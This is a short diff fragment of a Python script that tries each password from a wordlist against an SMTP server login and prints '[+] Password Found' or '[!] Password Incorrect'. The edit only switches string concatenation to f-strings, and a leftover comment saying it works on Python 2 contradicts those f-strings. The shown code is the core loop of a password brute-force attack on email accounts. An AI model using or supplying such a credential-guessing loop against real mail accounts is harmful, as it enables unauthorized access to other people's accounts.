@@ -12,10 +12,10 @@ for password in passwfile:
     try:
         smtpserver.login(user, password)
  
-        print("[+] Password Found: " + password)
+        print(f"[+] Password Found: {password}")
         break;
     except smtplib.SMTPAuthenticationError:
-        print("[!] Password Incorrect: " +password)
+        print(f"[!] Password Incorrect: {password}")
 
 
 #attemtion this works on python2 not on 3
